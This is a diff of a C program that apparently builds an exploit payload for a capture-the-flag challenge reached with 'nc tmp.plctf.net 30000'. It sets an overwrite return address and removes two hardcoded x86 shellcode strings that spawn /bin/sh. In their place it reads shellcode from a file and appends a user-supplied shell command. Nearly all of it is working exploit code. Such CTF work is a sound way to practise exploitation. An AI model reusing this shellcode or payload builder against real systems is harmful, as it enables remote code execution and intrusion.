@@ -5,6 +5,7 @@
 #define FILENAME "./evilfile.txt"
 #define RETURN_ADDRESS "\x00\x40\x41\x41"
 #define COMMAND "nc tmp.plctf.net 30000"
+#define SHELLCODE "./shellcode"
 
 /*
  My solution is basically to, within the first 8 bytes (which are easy to bruteforce)
@@ -46,15 +47,11 @@
 /* We'll just choose the biggest possible modulus */
 #define MOD               0xffffffff
 
-/* Note: shellcode can't contain newlines */
-/*#define SHELLCODE "\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\xeb\x16\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x4e\x41\x41\x41\x41\x42\x42\x42\x42"*/
-#define SHELLCODE "\x6a\x46\x58\x31\xdb\x31\xc9\xcd\x80\xeb\x21\x5f\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe6\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x57\x56\x53\x89\xe1\xcd\x80\xe8\xda\xff\xff\xff ls /; sleep 1; exit;\x00"
-
 int main(int argc, const char *argv[])
 {
   int multiplier = 0;
   FILE *f;
-  int shellcode_size = sizeof(SHELLCODE);
+  int shellcode_size;
   int buf_size;
 
   /* This is as much room as I have anyway... */
@@ -79,10 +76,20 @@ int main(int argc, const char *argv[])
     exit(1);
   }
 
+  f = fopen(SHELLCODE, "rb");
+  if(!f)
+  {
+    fprintf(stderr, "Couldn't open shellcode file: "SHELLCODE);
+    exit(1);
+  }
+  shellcode_size = fread(shellcode, 1, 0x1000, f);
+  shellcode[shellcode_size] = '\0';
+
   /* Yes, I'm using unsafe operations here, but it's purely local */
-  strcpy(shellcode, SHELLCODE);
+  strcat(shellcode, " ");
   strcat(shellcode, argv[1]);    /* Append the user's command */
-  strcat(shellcode, ";sleep 1"); /* Add a delay, which is required */
+  strcat(shellcode, "; sleep 1; exit;"); /* Add a delay, which is required */
+  shellcode_size = strlen(shellcode) + 1;
 
   if(strlen(shellcode) > 0x1000)
   {
